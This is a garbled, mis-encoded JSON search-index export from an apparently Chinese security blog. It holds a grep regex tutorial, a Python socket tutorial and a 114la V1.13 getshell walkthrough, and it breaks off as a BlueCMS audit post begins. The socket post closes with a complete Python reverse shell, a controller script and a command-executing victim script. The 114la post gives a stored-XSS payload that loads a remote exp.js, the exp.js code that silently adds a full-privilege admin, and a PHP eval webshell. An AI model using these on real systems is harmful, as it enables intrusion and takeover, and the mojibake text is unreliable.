/etc/passwd`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image036.jpg)\n\n####  2ã€$\n\n**ä½œç”¨ï¼š**é”šå®šè¡Œå°¾\n\n`grep bash$ /etc/passwd`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image038.jpg)\n\n####  3ã€.\n\n**ä½œç”¨ï¼š**åŒ¹é…ä¸ºéæ¢è¡Œç¬¦çš„ä»»æ„å­—ç¬¦\n\n`grep \"f....l\" test.txt`  å½“`.å­—ç¬¦`ä½äºä¸¤ä¸ªæŒ‡å®šæŒ‡å®šçš„å…³é”®å­—çš„ä¸­é—´æ—¶ï¼Œä¸€ä¸ª `. å­—ç¬¦`åŒ¹é…ä¸ºä¸€ä¸ªéæ¢è¡Œç¬¦çš„ä»»æ„å­—ç¬¦ã€‚ \n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image040.jpg)\n\n`grep \"f.\" test.txt`  å½“ `.å­—ç¬¦`ä½äºæœ«å°¾æ—¶åˆ™åŒ¹é…ä¸ºä»»æ„å¤šä¸ªéæ¢è¡Œç¬¦çš„å­—ç¬¦ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image042.jpg)\n\n####  4ã€\\\n\n**ä½œç”¨ï¼š**åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå…ˆå‰å­—ç¬¦\n\n`grep \"fu*\" test.txt` åˆ—å‡ºåŒ¹é…0ä¸ªæˆ–å¤šä¸ªå…³é”®å­—æ‰€åœ¨è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image044.jpg)\n\n####  5ã€[]\n\n**ä½œç”¨ï¼š**åŒ¹é…ä¸€ä¸ªæŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦\n\n`grep [ahb] test.txt`  åˆ—å‡ºå«æœ‰æŒ‡å®šèŒƒå›´å†…çš„1ä¸ªæˆ–å¤šä¸ªå…³é”®å­—çš„æ‰€åœ¨è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image046.jpg)\n\n####  6ã€[^]\n\n**ä½œç”¨ï¼š**åŒ¹é…ä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦\n\n`grep [^fabc] test.txt` åˆ—å‡ºé™¤äº†æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯æŒ‡å®šèŒƒå›´å†…çš„1ä¸ªæˆ–å¤šä¸ªå…³é”®å­—çš„æ‰€åœ¨è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image048.jpg)\n\n####  7ã€è¿‡æ»¤æœ‰æ•°å­—çš„è¡Œ\n\n`grep -v [0-9] test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image050.jpg)\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image051.jpg)\n\n####  8ã€æ‰“å°å‡ºæœ‰æ•°å­—çš„è¡Œ\n\n`grep [0-9] test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image053.jpg)\n\n####  9ã€æ‰“å°å‡ºæœ‰å­—ç¬¦çš„è¡Œ\n\n`grep [a-zA-Z] test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image055.jpg)\n\n#####  9.1 æ‰“å°å‡ºå°å†™å­—æ¯çš„è¡Œ\n\n`grep [a-z] test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image057.jpg)\n\n#####  9.2 æ‰“å°å‡ºå¤§å†™å­—æ¯çš„è¡Œ\n\n`grep [A-Z] test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image059.jpg)\n\n \n\n####  10ã€\\å…³é”®å­—\n\n**ä½œç”¨ï¼š**æ‰“å° `\\å…³é”®å­—` æ ‡è®°åŒ¹é…å­—ç¬¦\n\n`grep \\aaaaa test.txt` åˆ—å‡ºå«æœ‰å…³é”®å­—çš„æ‰€åœ¨è¡Œã€‚ï¼ˆ^é”šå®šè¡Œçš„å¼€å§‹  $é”šå®šè¡Œçš„ç»“æŸï¼‰ã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image061.jpg)\n\n####  11ã€`\\<`\n\n**ä½œç”¨ï¼š**é”šå®šå•è¯å¼€å§‹è¡Œ\n\n`grep \"\\<fl\" test.txt` åˆ—å‡ºä»¥å…³é”®å­—å¼€å¤´çš„å­—ç¬¦ä¸²æ‰€åœ¨è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image063.jpg)\n\n####  12ã€`\\>`\n\n**ä½œç”¨ï¼š**é”šå®šå•è¯ç»“æŸè¡Œ\n\n`grep \"fl\\>\" test.txt` åˆ—å‡ºä»¥å…³é”®å­—ç»“å°¾çš„å­—ç¬¦ä¸²æ‰€åœ¨è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image065.jpg)\n\n####  13ã€`x\\{m\\} `\n\n**ä½œç”¨ï¼š**é‡å¤è¿ç»­å­—ç¬¦x,mæ¬¡æ•°\n\n`grep \"a\\{4\\}\" test.txt` åˆ—å‡ºæ–‡ä»¶ä¸­å­˜åœ¨4ä¸ªåŠä»¥ä¸Šå…³é”®å­—açš„æ‰€åœ¨è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image067.jpg)\n\n####  14ã€`x\\{m,n\\} `\n\n**ä½œç”¨ï¼š**é‡å¤è¿ç»­å­—ç¬¦x,m-næ¬¡æ•°\n\n`grep \"a\\{7,9\\}\" test.txt` åˆ—å‡ºæ–‡ä»¶ä¸­å­˜åœ¨7ä¸ªåˆ°9ä¸ªè¿ç»­å…³é”®å­—açš„æ‰€åœ¨è¡Œã€‚\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image069.jpg)\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["linuxæ–‡æœ¬å¤„ç†"],"categories":["Tools"]},{"title":"Pythonï¼šSocketç¼–ç¨‹","url":"/posts/60850.html","content":"\n## Socket å¯¹è±¡æ–¹æ³•\n\n### æœåŠ¡å™¨ç«¯å¥—æ¥å­—\n\n| å‡½æ•°       | æè¿°                                                         |\n| :--------- | :----------------------------------------------------------- |\n| s.bind()   | ç»‘å®šåœ°å€ï¼ˆhost,portï¼‰åˆ°å¥—æ¥å­—ï¼Œ åœ¨AF_INETä¸‹,ä»¥å…ƒç»„ï¼ˆhost,portï¼‰çš„å½¢å¼è¡¨ç¤ºåœ°å€ã€‚ |\n| s.listen() | å¼€å§‹TCPç›‘å¬ã€‚backlogæŒ‡å®šåœ¨æ‹’ç»è¿æ¥ä¹‹å‰ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥æŒ‚èµ·çš„æœ€å¤§è¿æ¥æ•°é‡ã€‚è¯¥å€¼è‡³å°‘ä¸º1ï¼Œå¤§éƒ¨åˆ†åº”ç”¨ç¨‹åºè®¾ä¸º5å°±å¯ä»¥äº†ã€‚ |\n| s.accept() | è¢«åŠ¨æ¥å—TCPå®¢æˆ·ç«¯è¿æ¥,(é˜»å¡å¼)ç­‰å¾…è¿æ¥çš„åˆ°æ¥                 |\n\n### å®¢æˆ·ç«¯å¥—æ¥å­—\n\n| å‡½æ•°           | æè¿°                                                    |\n| -------------- | ------------------------------------------------------- |\n| s.connect()    | å»ºç«‹ä¸æœåŠ¡å™¨çš„è¿æ¥ï¼Œå¹¶å¼€å§‹ä¸‰æ¬¡æ¡æ‰‹                      |\n| s.connect_ex() | connect()å‡½æ•°çš„æ‰©å±•ç‰ˆæœ¬,å‡ºé”™æ—¶è¿”å›å‡ºé”™ç ,è€Œä¸æ˜¯æŠ›å‡ºå¼‚å¸¸ |\n\n### å…¬å…±ç”¨é€”çš„å¥—æ¥å­—å‡½æ•°\n\n| å‡½æ•°         | æè¿°                                                         |\n| ------------ | ------------------------------------------------------------ |\n| s.recv()     | æ¥æ”¶TCPæ•°æ®ï¼Œæ•°æ®ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ï¼ŒbufsizeæŒ‡å®šè¦æ¥æ”¶çš„æœ€å¤§æ•°æ®é‡ã€‚flagæä¾›æœ‰å…³æ¶ˆæ¯çš„å…¶ä»–ä¿¡æ¯ï¼Œé€šå¸¸å¯ä»¥å¿½ç•¥ã€‚ |\n| s.send()     | å‘é€TCPæ•°æ®ï¼Œå°†stringä¸­çš„æ•°æ®å‘é€åˆ°è¿æ¥çš„å¥—æ¥å­—ã€‚è¿”å›å€¼æ˜¯è¦å‘é€çš„å­—èŠ‚æ•°é‡ï¼Œè¯¥æ•°é‡å¯èƒ½å°äºstringçš„å­—èŠ‚å¤§å°ã€‚ |\n| s.sendall()  | å®Œæ•´å‘é€TCPæ•°æ®ï¼Œå®Œæ•´å‘é€TCPæ•°æ®ã€‚å°†stringä¸­çš„æ•°æ®å‘é€åˆ°è¿æ¥çš„å¥—æ¥å­—ï¼Œä½†åœ¨è¿”å›ä¹‹å‰ä¼šå°è¯•å‘é€æ‰€æœ‰æ•°æ®ã€‚æˆåŠŸè¿”å›Noneï¼Œå¤±è´¥åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚ |\n| s.recvfrom() | æ¥æ”¶UDPæ•°æ®ï¼Œä¸recv()ç±»ä¼¼ï¼Œä½†è¿”å›å€¼æ˜¯ï¼ˆdata,addressï¼‰ã€‚å…¶ä¸­dataæ˜¯åŒ…å«æ¥æ”¶æ•°æ®çš„å­—ç¬¦ä¸²ï¼Œaddressæ˜¯å‘é€æ•°æ®çš„å¥—æ¥å­—åœ°å€ã€‚ |\n| s.sendto()   | å‘é€UDPæ•°æ®ï¼Œå°†æ•°æ®å‘é€åˆ°å¥—æ¥å­—ï¼Œaddressæ˜¯å½¢å¼ä¸ºï¼ˆipaddrï¼Œportï¼‰çš„å…ƒç»„ï¼ŒæŒ‡å®šè¿œç¨‹åœ°å€ã€‚è¿”å›å€¼æ˜¯å‘é€çš„å­—èŠ‚æ•°ã€‚ |\n| s.close()    | å…³é—­å¥—æ¥å­—                                                   |\n\n## Socket API çš„è°ƒç”¨é¡ºåºå’Œ TCP çš„æ•°æ®æµ\n\n![sockets-tcp-flow](https://img.jwt1399.top//img/20200608225928.png)\n\n## æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯é€šä¿¡ğŸŒ°\n\n### æœåŠ¡ç«¯ï¼šsocket_server.py\n\n```python\n#! /usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport socket\nhost='' #å®šä¹‰ä¸€ä¸ªsocketæœåŠ¡ç«¯è¿è¡Œçš„IPï¼Œå¦‚æœä¸ç»™é»˜è®¤æ˜¯è¿è¡ŒsocketæœåŠ¡å™¨ä¸Šä¸»æœºä»»æ„çš„IPåœ°å€ã€‚\nport=18000 #å®šä¹‰çš„socketæœåŠ¡ç«¯çš„ç«¯å£å·ã€‚\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\t#socket.AF_INET  æœåŠ¡å™¨ä¹‹é—´ç½‘ç»œé€šä¿¡\n\t#socket.SOCK_STREAM æµå¼socket,TCPè¿›è¡Œé€šä¿¡çš„\n\t#socket.SOCK_DGRAM  æ•°æ®æŠ¥å¼socket,UDPè¿›è¡Œé€šä¿¡çš„\ns.bind((host,port)) #å°†socketç»‘å®šä¸Šåˆ°åœ°å€å’Œç«¯å£ä¸Šã€‚\ns.listen(2) #å¼€å§‹ç›‘å¬ä¼ å…¥è¿æ¥ã€‚ï¼ˆ2ä»£è¡¨å¯ä»¥ç›‘å¬2ä¸ªé“¾æ¥ï¼‰\nconn,addr=s.accept() #ä»socketå®¢æˆ·ç«¯æ¥æ”¶æ•°æ®,addrä»£è¡¨çš„æ˜¯å®¢æˆ·ç«¯çš„IP\nprint 'got connection from:',addr #è¾“å‡ºå®¢æˆ·ç«¯çš„IPåœ°å€\nwhile 1:\n     data=conn.recv(4096) #ä»å®¢æˆ·ç«¯æ¥æ”¶æ•°æ®ä¸€æ¬¡æ€§æ¥æ”¶4k\n     if not data:break #å¦‚æœdataæ•°æ®æ¥æ”¶å®Œäº†ï¼Œå°±è·³å‡ºè¿™ä¸ªæ­»å¾ªç¯\n     conn.sendall(data.upper()) #å°†å®¢æˆ·ç«¯å‘æ¥çš„æ•°æ®å˜æˆå¤§å†™ï¼Œå†å‘å›ç»™å®¢æˆ·ç«¯\nconn.close()#å…³é—­è¿æ¥\n```\n\n### å®¢æˆ·ç«¯ï¼šsocket_client.py\n\n```python\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\nimport socket\nh='192.168.1.110' #socketæœåŠ¡å™¨çš„IP\np=18000 #socketæœåŠ¡å™¨çš„ç«¯å£å·\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)#å®šä¹‰socketç±»å‹ï¼Œç½‘ç»œé€šä¿¡ï¼ŒTCP\ns.connect((h,p)) #è¿æ¥socketæœåŠ¡å™¨çš„IPå’Œç«¯å£å·\ns.send(\"hello my name is jwt\") #å‘æœåŠ¡ç«¯å‘é€æ•°æ®\nreceived_data = s.recv(1024) #æ¥æ”¶æ¥ä»äºSOCKETæœåŠ¡å™¨å‘ç»™æœ¬å®¢æˆ·ç«¯çš„æ•°æ®\ns.close()  #å…³é—­socketé“¾æ¥\nprint \"received from server:\",received_data #æ‰“å°ä»æœåŠ¡ç«¯æ¥æ”¶è¿‡æ¥çš„æ•°æ®\n```\n\n### ä»£ç æµ‹è¯•\n\n```python\n1.è¿è¡ŒsocketæœåŠ¡ç«¯:  python socket_server.py    \n2.æŸ¥çœ‹ç¨‹åºæ˜¯å¦è¿è¡Œ:   netstat -tupln\n3.è¿è¡Œsocketå®¢æˆ·ç«¯ï¼š python socket_client.py \n```\nè¿è¡Œç»“æœï¼š\n\n```bash\nå®¢æˆ·ç«¯\n# jwt @ pyj in ~ [22:38:32] C:1\n$ python socket_client.py\nreceived from server: HELLO MY NAME IS JWT\n\næœåŠ¡ç«¯\nkali@kali:~/Desktop$ python socket_server.py \ngot connection from: ('192.168.1.109', 2532)\n```\n\n## åå¼¹shell\n\n**æ§åˆ¶ç«¯ï¼š**\n\n```python\n#! /usr/bin/env python\n# -*- coding: utf-8 -*-\nimport socket\n\nhost = \"0.0.0.0\" #ç›‘å¬çš„åœ°å€\nport = 8888  #å¼€æ”¾ç›‘å¬çš„ç«¯å£\nserver_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #åˆ›é€ socketå¯¹è±¡\nserver_socket.bind((host,port)) #ç¡®å®šç›‘å¬åœ°å€å’Œç«¯å£\nserver_socket.listen(5) #å¯åŠ¨ç›‘å¬æœ€å¤§è¿æ¥æ•°ä¸º5\nprint('[+]ç«¯å£å¼€æ”¾åœ¨%d' % port)#æ‰“å°ä¿¡æ¯\n#ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥,è¿æ¥æˆåŠŸå°†å®¢æˆ·ç«¯å¥—æ¥å­—å¯¹è±¡å’Œè¿æ¥ç»†èŠ‚åˆ†åˆ«ä¿å­˜åœ¨clientå’Œaddrä¸­\nclient_socket,addr = server_socket.accept()\nprint('%s:%dè¿æ¥æˆåŠŸ' % (addr[0],addr[1]))#æ‰“å°ä¿¡æ¯\n#è¿›å…¥å¾ªç¯ä¿æŒäº¤äº’\nwhile True:\n\tcommand = input(\"<SHELL:#>\")#è¾“å…¥å‘½ä»¤\n\tclient_socket.send(command.encode())#å°†å‘½ä»¤å‘é€å‡ºå»\n\tdata = client_socket.recv(1024)#æ¥æ”¶å®¢æˆ·ç«¯è¿”å›çš„æ•°æ®\n\tprint (data.decode (\"gbk\",\"ignore\"))#æ‰“å°æ•°æ®\n```\n\n**å—æ§ç«¯**\n\n```python\n#! /usr/bin/env python\n# -*- coding: utf-8 -*-\nimport socket, subprocess\n\ntarget_host = \"192.168.1.111\" #è¿æ¥ç›®æ ‡çš„ipåœ°å€\ntarget_port = 8888 #è¿æ¥ç›®æ ‡çš„ç›‘å¬ç«¯å£\nclient_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#å»ºç«‹socketå¯¹è±¡\nclient_socket.connect((target_host,target_port))#å»ºç«‹è¿æ¥\ndef run_command (command) : #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‡½æ•°\n\tcommand = command.rstrip()#åˆ é™¤å­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼\n\ttry:#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤\n\t\toutput = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)\n\texcept:#æ‰§è¡Œå‘½ä»¤é”™è¯¯\n\t\toutput = b\"[-] Filed execute command\"\n\treturn output\n#è¿›å…¥å¾ªç¯ä¿æŒäº¤äº’\nwhile True:\n\tcommand = client_socket.recv(1024)#æ¥æ”¶ä¼ è¿‡æ¥çš„å‘½ä»¤\n\toutput = run_command (command.decode())#å°†å‘½ä»¤äº¤ç»™æ‰§è¡Œå‘½ä»¤å‡½æ•°å¤„ç†\n\tclient_socket.send ( output)#å°†æ‰§è¡Œç»“æœè¿”å›ç»™æœåŠ¡ç«¯\n```\n\n\n\n\n\n\n\n\n\n\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["Socketç¼–ç¨‹"],"categories":["Python"]},{"title":"114å•¦-V1.13å¯¼èˆªç«™Getshell","url":"/posts/31062.html","content":"\n114å•¦æ˜¯ä¸€ä¸ªè€ç‰Œçš„ç½‘å€å¯¼èˆªç«™ï¼Œé‡‡ç”¨php+Mysqlæ¶æ„ï¼ŒåŸºäºSmartyæ¨¡æ¿å¼•æ“ã€‚V1.13ä¸­åŒ…å«XSSæ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨æ¥Getshellã€‚\n\n## ç¯å¢ƒæ­å»º\n\n### æºç ä¸‹è½½åœ°å€\n\nä¸‹è½½é“¾æ¥ï¼šhttps://jwt1399.lanzoui.com/i06ZIde662b\n\n### å®‰è£…\n\n1.æŠŠä¸‹å¥½çš„`114å•¦`æºç æ–‡ä»¶`114la`æ”¾åˆ°`phpStudy`çš„`WWW`ç›®å½•ä¸‹\n\n2.è®¿é—®åœ°å€ï¼š`http://localhost/114la/upload/install/` é€‰æ‹©å…¨æ–°å®‰è£…,å°±ä¼šè¿›å…¥åˆ°å®‰è£…ç•Œé¢,æŒ‰ç…§æç¤ºé…ç½®å¥½å‚æ•°ï¼Œæ³¨æ„æ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç è¦ä¸ä½ çš„mysqlåŒ¹é…ï¼Œå®‰è£…ä¹‹åå°†è‡ªåŠ¨åˆ é™¤installç›®å½•\n\n3.è¿›å…¥åå°è®¾ç½®æ‚¨çš„ç®¡ç†ä¿¡æ¯ï¼Œå¹¶åœ¨â€œé™æ€ç”Ÿæˆâ€->â€œä¸€é”®ç”Ÿæˆâ€ç”Ÿæˆç›¸åº”çš„é¡µé¢\n\n4.å†è®¿é—®ï¼š`http://localhost/114la/upload/index.htm`ï¼Œå¯ä»¥çœ‹åˆ°å¯¼èˆªé¡µé¢äº†\n\n## XSSæ¼æ´åˆ©ç”¨\n\n**XSSæ¼æ´ç‚¹ï¼š**`url-submit/index.php`\n\n```php\n//18-22è¡Œ\n$name = (empty($_POST['name'])) ? '' : strip($_POST['name']);\n        if (empty($name))\n        {\n            throw new Exception('ç½‘ç«™åç§°ä¸èƒ½ä¸ºç©º', 10);\n        }\n//91-94è¡Œ\n$info = $_POST;\n$infos = addslashes(serialize($info));\napp_db::insert('ylmf_urladd', array('domain', 'info', 'addtime'), array($domain, $infos, time()));\n```\n\nå¯¹æäº¤çš„æ•°æ®åªä½¿ç”¨`addslashes`å‡½æ•°åœ¨å¼•å·å‰é¢æ·»åŠ `\\`,ä½¿ç”¨`serialize`å‡½æ•°åºåˆ—åŒ–è¾“å…¥çš„ä¿¡æ¯ï¼Œæœªåšå…¶ä»–è¿‡æ»¤ï¼Œç›´æ¥æ’å…¥æ•°æ®åº“,é€ æˆäº†å­˜å‚¨å‹XSSæ¼æ´\n\nåœ¨ç½‘ç«™åç§°é‚£ä¸€æ æ’å…¥`JS`,å…¶å®ƒçš„ç¬¦åˆè¦æ±‚å¡«å†™å°±å¯ä»¥äº†ï¼Œç„¶åæäº¤ï¼Œ\n\n```js\n<script>alert(123)</script>;\n```\n\n![](https://img.jwt1399.top//img/20200607160047.png)\n\nä½†æ˜¯æäº¤åä¸ä¼šå¼¹çª—ï¼ŒæŸ¥çœ‹æ•°æ®åº“ï¼Œçœ‹åˆ°JSä»£ç ç¡®å®æ’å…¥åˆ°äº†æ•°æ®åº“ä¸­ï¼Œè¿™å°±æ˜¯XSS[ç›²æ‰“](https://blog.csdn.net/weixin_43716322/article/details/89480895)\n\n![](https://img.jwt1399.top//img/20200607160242.png)\n\nå½“ç®¡ç†å‘˜åœ¨åå°è®¿é—®æ”¶å½•ç®¡ç†æ—¶ï¼Œæ³¨å…¥çš„JSä»£ç å°±ä¼šæ‰§è¡Œï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸå¼¹æ¡†\n\n![](https://img.jwt1399.top//img/20200607160053.png)\n\n\n\næ—¢ç„¶JSä»£ç èƒ½å¤ŸæˆåŠŸæ‰§è¡Œï¼Œé‚£æˆ‘ä»¬æ’å…¥ä¸€ä¸ªæ·»åŠ ç®¡ç†å‘˜è´¦æˆ·çš„è¿œç¨‹JSæ–‡ä»¶,ç­‰å¾…ç®¡ç†å‘˜æŸ¥çœ‹ç½‘ç«™æ”¶å½•å®¡æ ¸çš„æ—¶å€™å°±ä¼šæ‰§è¡ŒJSæ–‡ä»¶ï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦å·ï¼Œåç»­æˆ‘ä»¬è¿›å…¥åå°æ¥Getshell\n\n```\n<script src=http://192.168.1.109/exp.js></script>;\n```\n\n`exp.js`ç”¨æ¥åˆ›å»ºä¸€ä¸ªç”¨æˆ·åå¯†ç ä¸º`jwt/abc123`çš„ç®¡ç†å‘˜\n\n ```javascript\nvar siteurl = document.URL;\nsiteurl = siteurl.replace(/(.*\\/){0,}([^\\.]+).*/ig,\"$1\");\nvar username=\"jwt\";//ç”¨æˆ·å\nvar password=\"abc123\";//å¯†ç \nvar request = false;\n \nif(window.XMLHttpRequest) {\n\trequest = new XMLHttpRequest();\n\tif(request.overrideMimeType) {\n\t\trequest.overrideMimeType('text/xml');\n\t}\n} else if(window.ActiveXObject) {\n    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];\n\tfor(var i=0; i<versions.length; i++) {\n\t\ttry {\n\t\t\trequest = new ActiveXObject(versions[i]);\n\t\t\t} catch(e){}\n\t}\n}\n \nvar xmlhttp=request;\n \nxmlhttp.open(\"GET\",siteurl+\"/index.php?c=member\", false);\nxmlhttp.setRequestHeader(\"Referer\", siteurl);\nxmlhttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\nxmlhttp.send();\nif (xmlhttp.responseText.indexOf(username)<0) {\nxmlhttp.open(\"POST\", siteurl + \"/index.php?c=member&a=member_add\", false);\nxmlhttp.setRequestHeader(\"Referer\", siteurl);\nxmlhttp.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\nxmlhttp.send(\"name=\" + username + \"&password=\" + password + \"&step=2\");\nxmlhttp.open(\"POST\", siteurl + \"/index.php?c=member&a=member_edit\", false);\nxmlhttp.setRequestHeader(\"Referer\", siteurl);\nxmlhttp.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\nxmlhttp.send(\"auth%5Bmember114laurl_add114lafeedback%5D=1&auth%5Bconfig114la%5D=1&auth%5Bfamous_nav114lafamous_loop_playfamous_nav_tab114laindex_site114laindex_tool114lamztopl114larecycler%5D=1&auth%5Bzhuanti114lazhuanti_class%5D=1&auth%5Badvise_index114lakey%5D=1&auth%5Bbackup114larestore114larepair114laclear114lamysites%5D=1&auth%5Btemplate_manage%5D=1&auth%5Bmake_html114la%5D=1&auth%5Bheader114lamenu114lawelcome114laframe114lalogin%5D=1&auth%5Bsecurity114la%5D=1&auth%5Bsite_manage%5D=1&auth%5Bplan%5D=1&auth%5Bclass%5D=1&auth%5Blog%5D=1&step=2&name=\" + username);\n}\n ```\n\næˆ‘ä»¬è‡ªå·±æ¨¡æ‹Ÿç®¡ç†å‘˜è¿›åå°æŸ¥çœ‹æ”¶å½•ç®¡ç†ä¸€ä¸‹ï¼Œç„¶åå»ç”¨æˆ·ç®¡ç†ä¸­æŸ¥çœ‹æ˜¯å¦æ–°å»ºäº†jwtç”¨æˆ·\n\n![](https://img.jwt1399.top//img/20200607164030.png)\n\nä¸å‡ºæ‰€æ–™ï¼Œæœç„¶æˆåŠŸåˆ›å»ºäº†jwtç®¡ç†å‘˜\n\n## Getshell\n\nç”±äº114laç½‘ç«™ä½¿ç”¨çš„smartyæ¨¡æ¿å¼•æ“,è€Œsmartyæ”¯æŒæ’å…¥phpä»£ç ,è¿™æ ·å°±ä¼šå¯¼è‡´æ¼æ´äº§ç”Ÿäº†\n\n> **smartyé‡Œé¢æ‰§è¡ŒPHPä»£ç  :** `<{php}>ä»£ç <{/php}>`\n\né‚£æˆ‘ä»¬ç™»å½•jwtç”¨æˆ·,è¿›å…¥æ¨¡æ¿ç®¡ç†->ç”³è¯·æ”¶å½•ç‰ˆå—->æ’å…¥PHPä¸€å¥è¯æœ¨é©¬\n\n```php\n<{php}>@eval($_POST['a']);<{/php}> \n```\n\nç„¶åæˆ‘ä»¬ç”¨ğŸœğŸ—¡è¿æ¥ï¼Œåˆ°è¿™é‡Œæˆ‘ä»¬å°±æˆåŠŸGetshelläº†\n\n![](https://img.jwt1399.top//img/20200607164003.png)\n\n\n\n","tags":["æ¼æ´åˆ©ç”¨"],"categories":["Web"]},{"title":"ä»£ç å®¡è®¡ï¼šBlueCMS v1.6","url":"/posts/56307.html","content":"\n## ç¯å¢ƒæ­å»º\n\n### æºç 